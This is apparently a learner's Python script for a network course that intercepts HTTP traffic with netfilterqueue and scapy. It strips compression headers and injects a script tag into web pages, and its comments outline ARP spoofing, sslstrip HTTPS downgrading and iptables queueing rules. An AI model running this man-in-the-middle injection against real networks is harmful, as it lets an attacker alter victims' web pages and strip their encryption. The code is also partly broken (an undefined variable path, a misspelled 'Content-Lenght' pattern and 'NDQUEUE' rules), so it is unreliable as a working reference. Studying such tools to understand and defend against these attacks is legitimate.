import netfilterqueue
import scapy.all as scapy
import re


def setLoad(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    
    return packet


def processPacket(packet):
    myScapyPacket = scapy.IP(packet.get_payload())    # This is converting packet to scapy packet so we can see and change everything.
    print(myScapyPacket.show())
    if myScapyPacket.haslayer(scapy.Raw):
        load = myScapyPacket[scapy.Raw].load   # Useful data is in raw layer. So we are looking for it
        if myScapyPacket[scapy.TCP].dport == 80:
            print("[+] Request ")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)  # This method find the first string and replace it with the second string in our third string. So we basicly clear to get html in clear text.
    elif myScapyPacket[scapy.TCP].sport == 80:
        print("[+] Response")
        print(myScapyPacket.show())

        injectionCode = "<script>alert('hello');</script>"
        load = load.replace("</body>", injectionCode + "</body>")
        # When we investigate the load field from a http response we cannot see any html code. Because when we request that page we also say that give that page with gzip or deflate format. Gzip is a form of compressed html code
        contentLenghtSearch = re.search("(?:Content-Lenght:\s)(\d*)", load)  # we found what we want with regex. But we want to get just numbers. So we use 2 groups in this regex. First one is to locate out number. And the second one is out number. This is just getting the number

        if contentLenghtSearch and "text/html" in load:
            contentLength = contentLenghtSearch.group(1)  # So we are using group 1 one out number
            newContentLength = int(contentLength) + len(injectionCode)
            load = load.replace(contentLength, str(newContentLength))
            
    if load != myScapyPacket[scapy.Raw].load:
        newPacket = setLoad(myScapyPacket, load)
        packet.set_payload(str(newPacket))

    packet.accept()  # Packet has came to python and we accept it to go or we can drop the packet


queue = netfilterqueue.NetfilterQueue()

queue.bind(0, processPacket)    # This is bind this queue with the queue number 0 that we create before on linux system and every packet in that queue will go to process packet function

queue.run()

# HTTPS downgrading
# arpspoof yaptık

#sslstrip i çalıştırdık

# with sslstrip !!  iptables -t nat -A PREROUTING -p tcp --destination 80 -j REDIRECT --to-port 10000

# 80 portuna giden paketleri 10000 portune yönlendiriyoruz çünkü sslstrip orada çalışıyor. redirect

#packet sniffer ı çalıştırdık.

# bu sefer bunu kullanırken ve bu programı çalıştıracakken forward değil input ve output chain kullanıyoruz.

# ve gidiş ve geliş portlarını 10000 yapmamız lazım yani bu programdaki

# The linux Command for queueing packets

# iptables -I FORWARD -j NDQUEUE --queue-num 0

# iptables -I OUTPUT -j NDQUEUE --queue-num 0 -> this is my computer's network

# iptables -I INPUT -j NDQUEUE --queue-num 0

# iptables --flush


